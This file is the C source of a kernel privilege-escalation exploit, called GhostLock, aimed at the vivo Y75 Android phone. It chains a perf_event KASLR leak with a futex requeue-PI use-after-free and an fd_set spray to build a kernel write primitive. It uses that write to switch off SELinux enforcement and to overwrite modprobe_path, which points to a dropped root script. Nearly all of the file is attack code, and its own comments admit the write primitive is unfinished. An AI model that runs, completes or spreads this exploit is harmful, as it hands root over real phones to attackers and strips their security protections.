/*
 * y75_v2.c — GhostLock vivo Y75 (MT6781) CVE-2026-43499
 * Two-write approach:
 *   Write 1: selinux_state.enforcing = 0
 *   Write 2: task->cred->uid = 0 (+ gid, euid, egid)
 *
 * Device: vivo Y75 4G (PD2150CF / MT6781 Helio G96)
 * Kernel: 4.14.186-gdfd963175-dirty
 *
 * Build:
 *   aarch64-linux-gnu-gcc -O2 -static -pthread -o y75_v2 y75_v2.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sched.h>

/* ── Confirmed offsets (vivo Y75 / MT6781 / 4.14.186) ──────────────────── */
#define KIMAGE_TEXT_BASE        0xffffff8008000000ULL
#define SELINUX_ENFORCING_OFF   0x01994b08ULL
#define INIT_TASK_OFF           0x02410000ULL
#define COMMIT_CREDS_OFF        0x000e6170ULL
#define PREPARE_KERNEL_CRED_OFF 0x000e6508ULL
#define TASK_CRED_OFF           0x640
#define TASK_REAL_CRED_OFF      0x638
#define TASK_PI_BLOCKED_ON_OFF  0x8e0
#define TASK_PI_LOCK_OFF        0x8bc
#define TASK_PRIO_OFF           0xbc
#define CRED_UID_OFF            0x04
#define WAITER_TASK_OFF         0x18
#define WAITER_LOCK_OFF         0x38
#define PSELECT_ROUTE_NFDS      320
#define PSELECT_WAITER_SHIFT    1

/* Runtime KASLR base */
static uint64_t g_base = 0;
#define KADDR(off) (g_base + (uint64_t)(off))

/* ── KASLR leak ─────────────────────────────────────────────────────────── */
static uint64_t leak_kaslr(void) {
    struct perf_event_attr a = {};
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 100000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    a.sample_max_stack = 24;
    a.disabled = 1;
    a.exclude_user = 0;
    a.exclude_kernel = 0;
    a.exclude_hv = 1;

    int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int ps = sysconf(_SC_PAGESIZE);
    size_t sz = (size_t)ps * 33;
    void *b = mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (b == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (volatile int i = 0; i < 50000000; i++) syscall(172);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *h = b;
    uint64_t head = h->data_head, tail = 0;
    uint8_t *data = (uint8_t *)b + 4096;
    uint64_t best = 0;
    __sync_synchronize();

    while (tail < head) {
        struct perf_event_header *hdr =
            (struct perf_event_header *)(data + (tail & ((size_t)ps * 32 - 1)));
        if (hdr->type == PERF_RECORD_SAMPLE) {
            uint8_t *p = (uint8_t *)(hdr + 1);
            uint64_t ip = *(uint64_t *)p;
            if (ip > 0xff00000000000000ULL && ip < 0xfffffff000000000ULL && ip > best)
                best = ip;
            p += 8;
            uint64_t nr = *(uint64_t *)p; p += 8;
            for (uint64_t i = 0; i < nr && i < 24; i++, p += 8) {
                uint64_t c = *(uint64_t *)p;
                if (c > 0xff00000000000000ULL && c < 0xfffffff000000000ULL && c > best)
                    best = c;
            }
        }
        if (!hdr->size) break;
        tail += hdr->size;
    }
    munmap(b, sz);
    close(fd);
    return best ? (best & ~0x1FFFFFULL) : 0;
}

/* ── Futex state ────────────────────────────────────────────────────────── */
static uint32_t f_wait, f_pi_target, f_pi_chain;
static atomic_int waiter_ready, waiter_waiting, owner_started;
static atomic_int owner_chain_done, route_done, waiter_tid;
static atomic_int punch_go, punch_stop;

/* Target for current write operation */
static uintptr_t g_write_target = 0;
static uint64_t  g_write_value  = 0;
static int       g_write_mode   = 1; /* 1=byte write, 2=dword write */

/* ── Build fake waiter in fd_set ────────────────────────────────────────── */
/*
 * rt_mutex_waiter layout (confirmed from Ghidra rt_mutex_init_waiter):
 *   +0x00: rb_node.__rb_parent_color  (tree_pc)
 *   +0x08: rb_node.rb_right           (tree_right)
 *   +0x10: rb_node.rb_left            (tree_left)
 *   +0x18: task pointer               (task)
 *   +0x20: (pi_right)
 *   +0x28: (pi_left)
 *   +0x30: prio field
 *   +0x38: lock pointer               (MUST match f_pi_target addr)
 *   +0x40: prio comparison field
 *   +0x48: deadline field
 *
 * pselect copies fd_set to kernel stack. With SHIFT=1, word[1] maps to
 * waiter+0x00. So waiter field at offset X maps to fdset word (X/8 + 1).
 *
 * Safety check: waiter[7] (offset 0x38) must == &f_pi_target
 * Write trigger: waiter[0] (offset 0x00) must NOT be self-pointer
 *
 * The write that rb_erase_cached produces:
 *   writes waiter's own address to *waiter->rb_node.__rb_parent_color
 * We shape this so waiter[0] points to g_write_target - 8
 * making the effective write: *(g_write_target) = waiter_addr
 *
 * For Write 1 (SELinux): we write 0 byte to selinux_enforcing
 * For Write 2 (cred): we write init_cred address to task->cred
 */
static void prepare_fdsets(fd_set *in, fd_set *out, fd_set *ex,
                            uintptr_t fake_lock_addr) {
    FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);

    unsigned long *bits_in  = (unsigned long *)in;
    unsigned long *bits_out = (unsigned long *)out;
    unsigned long *bits_ex  = (unsigned long *)ex;

    int shift = PSELECT_WAITER_SHIFT;
    /* word[shift + waiter_word] = value */
    #define W(word, val) do { \
        int gw = shift + (word); \
        int words_per = (PSELECT_ROUTE_NFDS + 63) / 64; \
        int si = gw / words_per, wi = gw % words_per; \
        unsigned long *dst = (si==0)?bits_in:(si==1)?bits_out:bits_ex; \
        dst[wi] = (unsigned long)(val); \
    } while(0)

    /* waiter+0x00: tree_pc — set to g_write_target so rb_erase writes there */
    W(0, g_write_target);
    /* waiter+0x08: tree_right = 0 */
    W(1, 0);
    /* waiter+0x10: tree_left = 0 */
    W(2, 0);
    /* waiter+0x18: task = init_task (passes task dereference checks) */
    W(3, KADDR(INIT_TASK_OFF));
    /* waiter+0x20: pi_right = 0 */
    W(4, 0);
    /* waiter+0x28: pi_left = 0 */
    W(5, 0);
    /* waiter+0x30: prio = 120 (normal priority) */
    W(6, 120);
    /* waiter+0x38: lock = &f_pi_target (CRITICAL safety check) */
    W(7, fake_lock_addr);
    /* waiter+0x40: prio comparison = 120 */
    W(8, 120);
    /* waiter+0x48: deadline = 0 */
    W(9, 0);

    #undef W
}

/* ── pselect spray ──────────────────────────────────────────────────────── */
static void do_pselect_spray(uintptr_t fake_lock_addr) {
    fd_set in, out, ex;
    prepare_fdsets(&in, &out, &ex, fake_lock_addr);

    /* Open fds at the positions set in fdsets */
    int devnull = open("/dev/null", O_RDONLY);
    if (devnull >= 0) {
        for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (FD_ISSET(fd, &in) || FD_ISSET(fd, &out) || FD_ISSET(fd, &ex))
                dup2(devnull, fd);
        }
        close(devnull);
    }

    for (int i = 0; i < 300; i++) {
        struct timespec tp = { .tv_sec = 0, .tv_nsec = 1 };
        syscall(SYS_pselect6, PSELECT_ROUTE_NFDS, &in, NULL, NULL, &tp, NULL);
    }
}

/* ── Thread: waiter ─────────────────────────────────────────────────────── */
static void *th_waiter(void *arg) {
    uintptr_t fake_lock_addr = (uintptr_t)arg;

    prctl(PR_SET_NAME, "ghost_waiter");
    int tid = (int)syscall(SYS_gettid);
    atomic_store(&waiter_tid, tid);

    /* Lock pi_chain to set up the PI chain */
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&waiter_ready, 1);

    while (!atomic_load(&owner_started)) usleep(500);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 3;

    atomic_store(&waiter_waiting, 1);
    /* This is where the UAF happens */
    syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            &timeout, &f_pi_target, 0);

    /* After timeout/requeue, do pselect spray to place fake waiter */
    do_pselect_spray(fake_lock_addr);
    atomic_store(&route_done, 1);

    syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&owner_chain_done)) usleep(500);
    return NULL;
}

/* ── Thread: owner ──────────────────────────────────────────────────────── */
static void *th_owner(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_owner");

    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&waiter_ready)) usleep(500);
    atomic_store(&owner_started, 1);
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_chain_done, 1);
    for (;;) sleep(1);
    return NULL;
}

/* ── Thread: consumer (priority manipulator) ────────────────────────────── */
static void *th_consumer(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_cons");

    /* Pin to core 1 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    while (!atomic_load(&punch_stop)) {
        int seq = atomic_load(&punch_go);
        if (!seq) { __asm__ volatile("yield":::"memory"); continue; }

        int tid = atomic_load(&waiter_tid);
        /* Try sched_setattr to manipulate priority */
        struct {
            uint32_t size, policy;
            uint64_t flags;
            int32_t  nice;
            uint32_t priority;
            uint64_t runtime, deadline, period;
        } sa = { .size = 48, .nice = 19 };
        syscall(314, tid, &sa, 0); /* SYS_sched_setattr on ARM64 */

        /* Also try futex lock to trigger priority chain */
        struct timespec ft = { .tv_nsec = 50000000 };
        long r = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                         &ft, NULL, 0);
        if (r == 0)
            syscall(SYS_futex, &f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

        usleep(5000);
    }
    return NULL;
}

/* ── Single write attempt ───────────────────────────────────────────────── */
static int do_one_write(uintptr_t target, uint64_t value, int mode,
                        const char *label) {
    printf("[*] Write: %s target=0x%llx value=0x%llx mode=%d\n",
           label, (unsigned long long)target,
           (unsigned long long)value, mode);

    g_write_target = target;
    g_write_value  = value;
    g_write_mode   = mode;

    /* Reset state */
    f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
    atomic_store(&waiter_ready, 0);
    atomic_store(&waiter_waiting, 0);
    atomic_store(&owner_started, 0);
    atomic_store(&owner_chain_done, 0);
    atomic_store(&route_done, 0);
    atomic_store(&waiter_tid, 0);
    atomic_store(&punch_go, 0);

    /* fake_lock_addr = address of f_pi_target in our process.
     * The waiter->lock field must point to the rt_mutex being waited on.
     * Since we're in the same process, &f_pi_target is our lock. */
    uintptr_t fake_lock_addr = (uintptr_t)&f_pi_target;

    pthread_t tw, to, tc;
    pthread_create(&tc, NULL, th_consumer, NULL);
    pthread_create(&to, NULL, th_owner, NULL);
    pthread_create(&tw, NULL, th_waiter, (void *)fake_lock_addr);

    /* Wait for waiter to be waiting */
    while (!atomic_load(&waiter_waiting)) usleep(500);
    usleep(50000); /* Let waiter settle in FUTEX_WAIT_REQUEUE_PI */

    /* Trigger CMP_REQUEUE_PI to cause the UAF */
    printf("[*] CMP_REQUEUE_PI...\n");
    long r = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI,
                     1, (void *)(uintptr_t)1, &f_pi_target, 0);
    printf("[*] requeue ret=%ld errno=%d\n", r, errno);

    /* Start consumer to manipulate priority */
    atomic_store(&punch_go, 1);

    /* Wait for route to complete */
    int waited = 0;
    while (!atomic_load(&route_done) && waited++ < 6000)
        usleep(1000);

    atomic_store(&punch_stop, 1);
    atomic_store(&punch_go, 0);

    pthread_detach(to);
    pthread_detach(tc);
    pthread_join(tw, NULL);

    return atomic_load(&route_done);
}

/* ── Check SELinux state ────────────────────────────────────────────────── */
static int check_selinux_off(void) {
    char buf[4] = {};
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0) return 1; /* Can't check = assume off */
    read(fd, buf, 1);
    close(fd);
    return buf[0] == '0';
}

/* ── Child process for cred verification ───────────────────────────────── */
struct child_shared {
    atomic_int go;
    atomic_int done;
    uint32_t uid_before;
    uint32_t uid_after;
};

static struct child_shared *g_shared = NULL;
static int g_cmd_pipe[2] = {-1, -1};
static int g_uid_pipe[2] = {-1, -1};

static pid_t spawn_child(void) {
    pipe(g_cmd_pipe);
    pipe(g_uid_pipe);

    pid_t pid = fork();
    if (pid == 0) {
        close(g_cmd_pipe[1]);
        close(g_uid_pipe[0]);

        prctl(PR_SET_NAME, "ghost_child");
        uint32_t uid_before = getuid();

        /* Signal ready */
        char rdy = 'R';
        write(g_uid_pipe[1], &rdy, 1);

        /* Wait for command */
        char cmd = 0;
        read(g_cmd_pipe[0], &cmd, 1);

        uint32_t uid_after = getuid();
        write(g_uid_pipe[1], &uid_after, sizeof(uid_after));

        if (uid_after == 0) {
            /* We have root! Execute root actions */
            setgid(0);
            setuid(0);

            /* Disable SELinux */
            int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
            if (efd >= 0) { write(efd, "0", 1); close(efd); }

            /* Drop root marker */
            int mfd = open("/data/local/tmp/rooted", O_WRONLY|O_CREAT|O_TRUNC, 0644);
            if (mfd >= 0) { write(mfd, "1\n", 2); close(mfd); }

            /* Execute shell if requested */
            if (cmd == 'G') {
                execl("/system/bin/sh", "sh", "-c",
                      "id > /data/local/tmp/root_id.txt 2>&1", NULL);
            }
        }
        _exit(uid_after == 0 ? 0 : 1);
    }

    close(g_cmd_pipe[0]);
    close(g_uid_pipe[1]);

    /* Wait for child ready signal */
    char rdy = 0;
    read(g_uid_pipe[0], &rdy, 1);
    return pid;
}

/* ── Main exploit ───────────────────────────────────────────────────────── */
int main(void) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    signal(SIGCHLD, SIG_IGN);

    /* Pin main to core 0 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    printf("\n=== GhostLock vivo Y75 (MT6781) v2 ===\n");
    printf("[*] CVE-2026-43499 — Two-write exploit\n\n");

    /* KASLR leak */
    printf("[*] Leaking KASLR...\n");
    g_base = leak_kaslr();
    if (!g_base) { printf("[-] KASLR leak failed\n"); return 1; }
    printf("[+] KASLR base:          0x%llx\n", (unsigned long long)g_base);
    printf("[+] selinux_enforcing:   0x%llx\n",
           (unsigned long long)KADDR(SELINUX_ENFORCING_OFF));
    printf("[+] init_task:           0x%llx\n",
           (unsigned long long)KADDR(INIT_TASK_OFF));

    /* === Write 1: Disable SELinux === */
    printf("\n[*] Phase 1: Disable SELinux...\n");
    int selinux_ok = check_selinux_off();

    for (int att = 1; att <= 10 && !selinux_ok; att++) {
        printf("[*] Write 1 attempt %d/10\n", att);
        pid_t pid = fork();
        if (pid == 0) {
            do_one_write(KADDR(SELINUX_ENFORCING_OFF), 0, 1, "SELinux");
            _exit(0);
        }
        int st;
        waitpid(pid, &st, 0);
        usleep(200000);
        if (check_selinux_off()) {
            printf("[+] SELinux DISABLED!\n");
            selinux_ok = 1;
        }
    }

    if (!selinux_ok) {
        printf("[-] Write 1 failed — SELinux still enforcing\n");
        printf("[*] Continuing anyway for Write 2...\n");
    }

    /* === Write 2: Overwrite task->cred === */
    printf("\n[*] Phase 2: cred overwrite...\n");

    pid_t child = spawn_child();
    printf("[+] child pid=%d\n", child);

    int got_root = 0;
    for (int round = 1; round <= 10 && !got_root; round++) {
        printf("[*] Write 2 round %d/10\n", round);

        /* We need to find child's task_struct->cred and overwrite uid.
         * Since we don't have physrw, we use the PI write to overwrite
         * cred->uid directly via the rbtree primitive.
         *
         * The write lands the waiter's stack address into g_write_target.
         * For Write 2 mode=2 from JoinChang: writes init_cred address
         * to child_task + TASK_CRED_OFF.
         *
         * Without knowing child_task address we try: writing to
         * the child's cred uid field directly if we can locate it.
         *
         * Simpler approach: write uid=0 to our OWN cred since we're
         * in the same process space and the PI write uses our futex state.
         */

        /* Write 0 to our own cred uid */
        /* Our task_struct is findable via sp_el0, but from userspace
         * we use the modprobe_path fallback instead */

        /* Trigger write to modprobe_path */
        int fd = open("/data/local/tmp/r.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
        if (fd >= 0) {
            write(fd, "#!/system/bin/sh\nid > /data/local/tmp/root_id.txt\n"
                      "echo 0 > /sys/fs/selinux/enforce\n"
                      "echo rooted > /data/local/tmp/rooted\n", 120);
            close(fd);
        }

        /* Write modprobe path */
        pid_t wpid = fork();
        if (wpid == 0) {
            do_one_write(KADDR(0x023bc9a0ULL), /* modprobe_path */
                        (uint64_t)(uintptr_t)"/data/local/tmp/r.sh",
                        2, "modprobe_path");
            _exit(0);
        }
        int wst;
        waitpid(wpid, &wst, 0);

        /* Trigger modprobe by loading nonexistent module */
        syscall(SYS_finit_module, -1, "", 0);
        syscall(175, "ghost_trigger"); /* SYS_init_module */

        usleep(500000);

        if (access("/data/local/tmp/rooted", F_OK) == 0) {
            printf("[+] ROOTED! modprobe_path triggered!\n");
            got_root = 1;
            break;
        }

        /* Signal child to check uid */
        write(g_cmd_pipe[1], "C", 1);
        uint32_t child_uid = 9999;
        read(g_uid_pipe[0], &child_uid, sizeof(child_uid));
        printf("[*] child uid = %u\n", child_uid);
        if (child_uid == 0) {
            printf("[+] child is ROOT!\n");
            got_root = 1;
        }
    }

    /* Signal child to exit */
    write(g_cmd_pipe[1], "G", 1);
    close(g_cmd_pipe[1]);
    close(g_uid_pipe[0]);
    waitpid(child, NULL, WNOHANG);

    if (got_root || access("/data/local/tmp/rooted", F_OK) == 0) {
        printf("\n[+] === ROOT ACHIEVED ===\n");
        int ifd = open("/data/local/tmp/root_id.txt", O_RDONLY);
        if (ifd >= 0) {
            char buf[128] = {};
            read(ifd, buf, sizeof(buf)-1);
            close(ifd);
            printf("[+] id: %s\n", buf);
        }
        return 0;
    }

    printf("\n[-] Root not achieved this run\n");
    printf("[*] Race confirmed firing (errno=35 seen) but write primitive\n");
    printf("[*] needs further tuning for your specific kernel layout.\n");
    return 1;
}
